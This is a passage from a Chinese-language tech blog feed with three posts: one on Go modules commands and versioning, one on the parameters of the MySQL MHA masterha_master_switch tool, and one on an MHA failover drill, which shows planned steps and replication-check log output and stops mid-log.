go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">download    download modules to local cache (下载依赖的 modules 到本地 cache)</span><br><span class="line">edit        edit <span class="keyword">go</span>.mod from tools or scripts (编辑 <span class="keyword">go</span>.mod 文件)</span><br><span class="line">graph       <span class="built_in">print</span> module requirement graph (打印模块依赖图)</span><br><span class="line">init        initialize <span class="built_in">new</span> module in current directory (再当前文件夹下初始化一个新的 module, 创建 <span class="keyword">go</span>.mod 文件)</span><br><span class="line">tidy        add missing and remove unused modules (增加丢失的 modules，去掉未用的 modules)</span><br><span class="line">vendor      <span class="built_in">make</span> vendored <span class="built_in">copy</span> of dependencies (将依赖复制到 vendor 下)</span><br><span class="line">verify      verify dependencies have expected content (校验依赖)</span><br><span class="line">why         explain why packages or modules are needed (解释为什么需要依赖)</span><br></pre></td></tr></tbody></table></figure><p></p><p>看这些命令的帮助已经比较容易了解命令的功能。</p><h4 id="既有项目"><a href="#既有项目" class="headerlink" title="既有项目"></a>既有项目</h4><p>假设你已经有了一个 go 项目， 比如在<code>$GOPATH/github.com/wangjiemim/mytest</code>下， 你可以使用<code>go mod init github.com/wangjiemim/mytest</code>在这个文件夹下创建一个空的 go.mod (只有第一行 <code>module github.com/wangjiemim/mytest</code>)。</p><p>然后你可以通过 <code>go get ./...</code>让它查找依赖，并记录在 go.mod 文件中 (你还可以指定 <code>-tags</code>, 这样可以把 tags 的依赖都查找到)。</p><p>通过<code>go mod tidy</code>也可以用来为 go.mod 增加丢失的依赖，删除不需要的依赖，但是我不确定它怎么处理<code>tags</code>。</p><p>执行上面的命令会把 go.mod 的<code>latest</code>版本换成实际的最新的版本，并且会生成一个go.sum记录每个依赖库的版本和哈希值。</p><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>在国内访问<code>golang.org/x</code>的各个包都需要梯子，你可以在 go.mod 中使用<code>replace</code>替换成 github 上对应的库。<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">replace (</span><br><span class="line">  golang.org/x/crypto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180820150726</span><span class="number">-614d</span>502a4dac => github.com/golang/crypto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180820150726</span><span class="number">-614d</span>502a4dac</span><br><span class="line">  golang.org/x/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180821023952</span><span class="number">-922f</span>4815f713 => github.com/golang/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20180826012351</span><span class="number">-8</span>a410e7b638d</span><br><span class="line">  golang.org/x/text v0<span class="number">.3</span><span class="number">.0</span> => github.com/golang/text v0<span class="number">.3</span><span class="number">.0</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>依赖库中的<code>replac</code>e对你的主 go.mod 不起作用，比如<code>github.com/wangjiemin/mytest</code>的 go.mod 已经增加了<code>replace</code>, 但是你的 go.mod 虽然<code>require</code>了<code>rpcx</code>的库，但是没有设置<code>replace</code>的话， <code>go get</code>还是会访问<code>golang.org/x</code>。</p><p>所以如果想编译那个项目，就在哪个项目中增加<code>replace</code>。</p><h4 id="包的版本控制"><a href="#包的版本控制" class="headerlink" title="包的版本控制"></a>包的版本控制</h4><p>下面的版本都是合法的：<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopkg.in/tomb.v1 v1<span class="number">.0</span><span class="number">.0</span><span class="number">-20141024135613</span>-dd632973f1e7</span><br><span class="line">gopkg.in/vmihailenco/msgpack.v2 v2<span class="number">.9</span><span class="number">.1</span></span><br><span class="line">gopkg.in/yaml.v2 <=v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line">github.com/tatsushid/<span class="keyword">go</span>-fastping v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20160109021039</span>-d7bb493dee3e</span><br><span class="line">latest</span><br></pre></td></tr></tbody></table></figure><p></p><p>版本号遵循如下规律：<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vX.Y.Z-pre<span class="number">.0</span>.yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX<span class="number">.0</span><span class="number">.0</span>-yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX.Y.(Z+<span class="number">1</span>)<span class="number">-0.</span>yyyymmddhhmmss-abcdefabcdef</span><br><span class="line">vX.Y.Z</span><br></pre></td></tr></tbody></table></figure><p></p><p>也就是版本号 + 时间戳 + hash，我们自己指定版本时只需要制定版本号即可，没有版本 tag 的则需要找到对应 commit 的时间和 hash 值。</p><p>另外版本号是支持 query 表达式的，其求值算法是 “选择最接近于比较目标的版本 (tagged version)”，即上文中的 gopkg.in/yaml.v2 会找不高于 v2.2.1 的最高版本。</p><p>对于复杂的包依赖场景，可以参考 Russ Cox 在 <a href="https://research.swtch.com/vgo-mvs" target="_blank" rel="noopener">“Minimal Version Selection”</a> 一文中给出的形象的算法解释 (注意：这个算法仅是便于人类理解，但是性能低下，真正的实现并非按照这个算法实现)。</p><h4 id="go-get-升级"><a href="#go-get-升级" class="headerlink" title="go get 升级"></a>go get 升级</h4><ul><li>运行 <code>go get -u</code> 将会升级到最新的次要版本或者修订版本 (x.y.z，z 是修订版本号， y 是次要版本号)</li><li>运行 <code>go get -u=patch</code> 将会升级到最新的修订版本</li><li>运行 <code>go get package@version</code> 将会升级到指定的版本号<code>version</code></li></ul><h4 id="go-modules-与-vendor"><a href="#go-modules-与-vendor" class="headerlink" title="go modules 与 vendor"></a>go modules 与 vendor</h4><p>在最初的设计中，Russ Cox 是想彻底废除掉 vendor 的，但在社区的反馈下，vendor 得以保留，这也是为了兼容 Go 1.11 之前的版本。</p><p>Go modules 支持通过<code>go mod vendor</code>命令将某个 module 的所有依赖保存一份 copy 到 root module dir 的 vendor 下，然后在构建的使用<code>go build -mod=vendor</code>即可忽略 cache 里的包而只使用 vendor 目录里的版本。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://semver.org/lang/zh-CN/" target="_blank" rel="noopener">语义化版本 2.0.0 | Semantic Versioning</a></li><li><a href="https://golang.google.cn/cmd/go/#hdr-Module_maintenance" target="_blank" rel="noopener">go - The Go Programming Language</a></li><li><a href="https://github.com/golang/go/wiki/Modules" target="_blank" rel="noopener">Modules · golang/go Wiki · GitHub</a></li><li><a href="https://roberto.selbach.ca/intro-to-go-modules/" target="_blank" rel="noopener">Introduction to Go Modules – Roberto Selbach</a></li><li><a href="https://tonybai.com/2018/07/15/hello-go-module/" target="_blank" rel="noopener">初窥 Go module | Tony Bai</a></li><li><a href="https://www.lightblue.asia/golang-1-11-new-festures-modules/" target="_blank" rel="noopener">Golang 1.11 新功能介紹 - Modules - LightBlue Essay</a></li><li><a href="https://gocn.vip/article/957" target="_blank" rel="noopener">Golang modules 初探 - Go 中国技术社区 - golang</a></li><li><a href="https://colobu.com/2018/08/27/learn-go-module/" target="_blank" rel="noopener">跳出 Go module 的泥潭 | 鸟窝</a></li><li><a href="https://windmt.com/2018/11/08/first-look-go-modules/" target="_blank" rel="noopener">Go 包管理解决之道 —— Modules 初试</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Go 的包管理是一直是为人诟病之处，从 Go 1.5 引入的 vendor 机制，到准官方工具 dep，目前为止还没一个简便的解决方案&lt;/p
      
    
    </summary>
    
      <category term="Golang" scheme="https://jiemin.wang/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://jiemin.wang/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>masterha-master-switch 参数详解</title>
    <link href="https://jiemin.wang/2019/03/28/masterha-master-switch/"/>
    <id>https://jiemin.wang/2019/03/28/masterha-master-switch/</id>
    <published>2019-03-28T11:45:02.000Z</published>
    <updated>2019-03-28T11:52:40.322Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MHA-命令-masterha-master-switch"><a href="#MHA-命令-masterha-master-switch" class="headerlink" title="MHA 命令 masterha_master_switch"></a>MHA 命令 <a href="https://github.com/yoshinorim/mha4mysql-manager/wiki/masterha_master_switch" target="_blank" rel="noopener">masterha_master_switch</a></h4><p>常用参数介绍<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">--master_state=dead</span><br><span class="line">    强制的参数，参数值为<span class="string">"dead"</span> 或者 <span class="string">"alive"</span> . 如果 设置为 alive 模式，masterha_master_switch 开始在线主库切换操作。</span><br><span class="line"> </span><br><span class="line">--dead_master_host=(hostname)</span><br><span class="line">    强制参数，宕机的主库所在的主机名称。--dead_master_ip 和 --dead_master_port 是可选参数，如果这些参数没有设置，--dead_master_ip 就是 --dead_master_host 解析的IP地址。--dead_master_port 为 3306</span><br><span class="line"> </span><br><span class="line">--new_master_host=(hostname)</span><br><span class="line">    新主机地址，可选参数，这个参数在你明确新的主库的主机，非常有用。(这就意味着你不需要让MHA来决定新的主库)。如果不设置此参数，MHA 将会利用自动failover的规则来选择新的主库。如果设置--new_master_host，MHA选择此主机为新的主库，如果不能成为主库，MHA将会退出</span><br><span class="line"> </span><br><span class="line">--interactive=(0|1)</span><br><span class="line">    如果设置为0，在masterha_master_switch，它自动执行故障转移(非交互式)。这实际上是和masterha_manager的内部运行机制一样，这种非交互式故障转移是有用的，如果你已经证实了master死了,但你想尽快做故障转移。非交互式故障转移也是有用的,如果你使用其他现有的主监控软件和要调用的非交互式故障转移命令软件。典型的例子是masterha_master_switch调用从集群软件像起搏器。</span><br><span class="line"> </span><br><span class="line">--ssh_reachable=(0|1|2)</span><br><span class="line">    指定master 经过SSH是否可达。0:不可达、1:可达、2:未知(默认值)。 如果设置为了2，此命令内部将会检测通过SSH 是否可达master，并且跟新SSH 状态。如果可达，且设置master_ip_failover_script 或者 shutdown_script .将会执行<span class="string">"--command=stopssh"</span>。否则，执行 <span class="string">"--command=stop"</span>。另外，如果宕机的master通过SSH可达，failover脚本试图从宕机的master机器上拷贝没有没有发送的binlog。</span><br><span class="line"> </span><br><span class="line">--skip_change_master</span><br><span class="line">    如果设置此参数，当发生failover的时候，MAH 在应用完不同的relay <span class="built_in">log</span>退出，忽略CHANGE MASTER 和 START SLAVE 操作。所以 slaves 不会指向 新的master. 开启此参数，有利于手动的二次检查slave 恢复是否成功</span><br><span class="line"> </span><br><span class="line">--skip_disable_read_only</span><br><span class="line">    设置此参数，MHA 将不会在新的主库上执行 SET GLOBAL read_only =0 操作，有利于手动操作</span><br><span class="line"> </span><br><span class="line">--last_failover_minute=(minutes)</span><br><span class="line">    参考master_manager </span><br><span class="line"> </span><br><span class="line">--ignore_last_failover</span><br><span class="line">    参考master_manager</span><br><span class="line"> </span><br><span class="line">--wait_on_failover_error=(seconds)</span><br><span class="line">    类似于master_manager, 此参数只用于自动的/非交互式的failover。如果没有设置--interval=0，wait_on_failover_error 将会被忽略，在发生错误的时候不会sleep。</span><br><span class="line"> </span><br><span class="line">--remove_dead_master_conf</span><br><span class="line">    参考masterha_manager</span><br><span class="line"> </span><br><span class="line">--wait_until_gtid_in_sync(0|1)</span><br><span class="line">    此参数从0.56版本开始可用，如果设置成1，当基于GITD的failover时,MHA 会等待所有的从库追上新主库的GITD</span><br><span class="line"> </span><br><span class="line">--skip_change_master</span><br><span class="line">    此参数从0.56版本开始可用，如果开启此选项，MHA 跳过 CHANGE MASTER 的操作</span><br><span class="line"> </span><br><span class="line">--skip_disable_read_only</span><br><span class="line">    此参数从0.56版本开始可用，如果开启此选项，MHA 将会在新的master 跳过 SET GLOBAL read_only = 0;</span><br><span class="line"> </span><br><span class="line">--ignore_binlog_server_error</span><br><span class="line">    此参数从0.56版本开始可用，如果开启此选项，当执行failover的时，MHA忽略binlog server上任何错误</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="主在线切换时相关参数"><a href="#主在线切换时相关参数" class="headerlink" title="主在线切换时相关参数"></a>主在线切换时相关参数</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--new_master_host=(hostname)</span><br><span class="line">    新主机地址，可选参数，这个参数在你明确新的主库的主机，非常有用。(这就意味着你不需要让MHA来决定新的主库)。如果不设置此参数，MHA 将会利用自动failover的规则来选择新的主库。如果设置--new_master_host，MHA选择此主机为新的主库，如果不能成为主库，MHA将会退出</span><br><span class="line"> </span><br><span class="line">--orig_master_is_new_slave</span><br><span class="line">    当完成主库切换后，原先的主库将作为现在主库的slave运行。默认:不开启(原先的主库不会加入到新的复制环境中)。如果开启此选项，需要在配置文件中设置repl_password参数，由于当期的Master并不知道新的Master的replication的密码</span><br><span class="line"> </span><br><span class="line">--remove_orig_master_conf</span><br><span class="line">    如果设置此参数，当成功failover后，MHA manager将会自动删除配置文件中关于dead master的配置选项。</span><br><span class="line"> </span><br><span class="line">--skip_lock_all_tables</span><br><span class="line">    当在做主库切换的时候，MHA会在原先的主库上执行FLUSH TABLES WITH READ LOCK 操作，确保没有跟新操作，但是FLUSH TABLES WITH READ LOCK 操作是非常耗费资源的，并且你可以在原先的主库确定没有跟新操作(通过master_ip_online_change_script 中<span class="built_in">kill</span> all clients操作等)。可以利用此选项避免锁表。</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MHA-命令-masterha-master-switch&quot;&gt;&lt;a href=&quot;#MHA-命令-masterha-master-switch&quot; class=&quot;headerlink&quot; title=&quot;MHA 命令 masterha_master_switch&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/categories/MySQL/MHA/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/tags/MHA/"/>
    
  </entry>
  
  <entry>
    <title>MHA 故障切换演练 --- masterha_master_switch</title>
    <link href="https://jiemin.wang/2019/03/28/mha-switch/"/>
    <id>https://jiemin.wang/2019/03/28/mha-switch/</id>
    <published>2019-03-28T02:33:34.000Z</published>
    <updated>2019-03-28T11:48:11.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天公司要进行线上MHA高可用集群故障切换演练。由于我刚入职公司。公司还没有做过太多的灾难级别的故障演练。</p><h5 id="我写了一些步骤："><a href="#我写了一些步骤：" class="headerlink" title="我写了一些步骤："></a>我写了一些步骤：</h5><h6 id="故障切换"><a href="#故障切换" class="headerlink" title="故障切换"></a>故障切换</h6><ol><li>查看主从延迟状态</li><li>登录MHA中控机，查看演练切换的数据库MHA log文件，使用tail -f 命令来获取切换的log日志信息</li><li>登录master机器，执行 /etc/init.d/mysql stop</li><li>查看MHA中控机日志信息。</li><li>切换成功，登录到 new_master 中查看vip是否已经绑定到网卡上</li><li>登录slave，查看 show slave status 是否已经change master to new_master ip上，查看slave正常与否</li><li>在 MHA 中控机启动 masterha_manager 进程，查看MHA集群启动是否正常。(两节点)<br>结构图：<br>new_master: (master)<br>—> slave: (slave)</li></ol><h6 id="master-数据库恢复"><a href="#master-数据库恢复" class="headerlink" title="master 数据库恢复"></a>master 数据库恢复</h6><ol><li>登录到old_master 机器上执行 /etc/init.d/mysql start 是否正常启动服务</li><li>在MHA中控机中获取切换的log 日志信息找出 change master to new_master 信息语句</li><li>在old_master 中执行change master to 语句，变为 new_master的slave</li><li>show slave status 查看 old_master 是否正常变为 new_master 的slave</li><li>在MHA 中控机节点，执行 masterha_stop 命令结束 masterha_manager进程。</li><li>在MHA 中控机启动 masterha_manager 进程，查看恢复好的old_master是否正常加入到MHA节点 (三节点）<br>结构图：<br>new_master: (master)<br>—> old_master: (slave)<br>—> slave: (slave)</li></ol><h6 id="恢复-old-master为-master-角色"><a href="#恢复-old-master为-master-角色" class="headerlink" title="恢复 old_master为 master 角色"></a>恢复 old_master为 master 角色</h6><ol><li>查看主从延迟状态</li><li>登录MHA中控机，查看演练切换的数据库MHA log文件，使用tail -f 命令来获取切换的log日志信息</li><li>登录new_master机器，执行 /etc/init.d/mysql stop</li><li>查看MHA中控机日志信息。</li><li>切换成功，登录到 old_master 中查看vip是否已经绑定到网卡上</li><li>登录slave，查看 show slave status 是否已经change master to old_master ip上，查看slave正常与否</li><li>在 MHA 中控机启动 masterha_manager 进程，查看MHA集群启动是否正常。(两节点)<br>结构图：<br>master(old_master): (master)<br>—> slave(new_master): (slave)<br>—> slave: (slave)</li></ol><h5 id="但是这么操作虽然能更贴近真实灾难-暂时没有把主从数据延迟考虑进入-，需要的时间会更多。领导建议手动操作MHA-failover测试能不能切换。"><a href="#但是这么操作虽然能更贴近真实灾难-暂时没有把主从数据延迟考虑进入-，需要的时间会更多。领导建议手动操作MHA-failover测试能不能切换。" class="headerlink" title="但是这么操作虽然能更贴近真实灾难(暂时没有把主从数据延迟考虑进入)，需要的时间会更多。领导建议手动操作MHA failover测试能不能切换。"></a>但是这么操作虽然能更贴近真实灾难(暂时没有把主从数据延迟考虑进入)，需要的时间会更多。领导建议手动操作MHA failover测试能不能切换。</h5><h2 id="服务器架构"><a href="#服务器架构" class="headerlink" title="服务器架构"></a>服务器架构</h2><table><thead><tr><th style="text-align:center">server</th><th style="text-align:center">role</th></tr></thead><tbody><tr><td style="text-align:center">master</td><td style="text-align:center">old_master</td></tr><tr><td style="text-align:center">slave</td><td style="text-align:center">new_master</td></tr><tr><td style="text-align:center">slave</td><td style="text-align:center">slave</td></tr></tbody></table><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>在MHA 中控机中执行命令<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># masterha_check_repl --conf=/root/dba/mha/conf/babybi_#1.conf</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">Wed Mar 27 23:28:28 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] MHA::MasterMonitor version 0.56.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] GTID failover mode = 0</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Dead Servers:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Alive Servers:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.67(10.25.1.67:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.68(10.25.1.68:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Alive Slaves:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.67(10.25.1.67:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Primary candidate <span class="keyword">for</span> the new Master (candidate_master is <span class="built_in">set</span>)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.68(10.25.1.68:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Checking slave configurations..</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [warning]  relay_log_purge=0 is not <span class="built_in">set</span> on slave 10.25.1.67(10.25.1.67:3306).</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [warning]  relay_log_purge=0 is not <span class="built_in">set</span> on slave 10.25.1.68(10.25.1.68:3306).</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Checking replication filtering settings..</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]  binlog_do_db= , binlog_ignore_db= </span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]  Replication filtering check ok.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] GTID (with auto-pos) is not supported</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Starting SSH connection tests..</span><br><span class="line">Wed Mar 27 23:28:29 2019 - [info] All SSH connection tests passed successfully.</span><br><span class="line">Wed Mar 27 23:28:29 2019 - [info] Checking MHA Node version..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]  Version check ok.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Checking SSH publickey authentication settings on the current master..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] HealthCheck: SSH to 10.25.1.66 is reachable.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Master MHA Node version is 0.56.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Checking recovery script configurations on 10.25.1.66(10.25.1.66:3306)..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]   Executing <span class="built_in">command</span>: save_binary_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --start_pos=4 --binlog_dir=/<span class="built_in">log</span>/mysql/binlog/ --output_file=/var/tmp/save_binary_logs_test --manager_version=0.56 --start_file=mysql-bin.004691 </span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]   Connecting to root@10.25.1.66(10.25.1.66:22).. </span><br><span class="line">  Creating /var/tmp <span class="keyword">if</span> not exists..    ok.</span><br><span class="line">  Checking output directory is accessible or not..</span><br><span class="line">   ok.</span><br><span class="line">  Binlog found at /<span class="built_in">log</span>/mysql/binlog/, up to mysql-bin.004691</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Binlog setting check <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Executing <span class="built_in">command</span> : apply_diff_relay_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --slave_user=<span class="string">'mha'</span> --slave_host=10.25.1.67 --slave_ip=10.25.1.67 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info  --relay_dir=/my/data/percona/  --slave_pass=xxx</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Connecting to root@10.25.1.67(10.25.1.67:22).. </span><br><span class="line">  Checking slave recovery environment settings..</span><br><span class="line">    Opening /my/data/percona/relay-log.info ... ok.</span><br><span class="line">    Relay <span class="built_in">log</span> found at /<span class="built_in">log</span>/mysql/relaylog, up to relay-log.014072</span><br><span class="line">    Temporary relay <span class="built_in">log</span> file is /<span class="built_in">log</span>/mysql/relaylog/relay-log.014072</span><br><span class="line">    Testing mysql connection and privileges..Warning: Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line"> <span class="keyword">done</span>.</span><br><span class="line">    Testing mysqlbinlog output.. <span class="keyword">done</span>.</span><br><span class="line">    Cleaning up <span class="built_in">test</span> file(s).. <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Executing <span class="built_in">command</span> : apply_diff_relay_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --slave_user=<span class="string">'mha'</span> --slave_host=10.25.1.68 --slave_ip=10.25.1.68 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info  --relay_dir=/my/data/percona/  --slave_pass=xxx</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Connecting to root@10.25.1.68(10.25.1.68:22).. </span><br><span class="line">  Checking slave recovery environment settings..</span><br><span class="line">    Opening /my/data/percona/relay-log.info ... ok.</span><br><span class="line">    Relay <span class="built_in">log</span> found at /<span class="built_in">log</span>/mysql/relaylog, up to relay-log.014072</span><br><span class="line">    Temporary relay <span class="built_in">log</span> file is /<span class="built_in">log</span>/mysql/relaylog/relay-log.014072</span><br><span class="line">    Testing mysql connection and privileges..Warning: Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line"> <span class="keyword">done</span>.</span><br><span class="line">    Testing mysqlbinlog output.. <span class="keyword">done</span>.</span><br><span class="line">    Cleaning up <span class="built_in">test</span> file(s).. <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Slaves settings check <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] </span><br><span class="line">10.25.1.66(10.25.1.66:3306) (current master)</span><br><span class="line"> 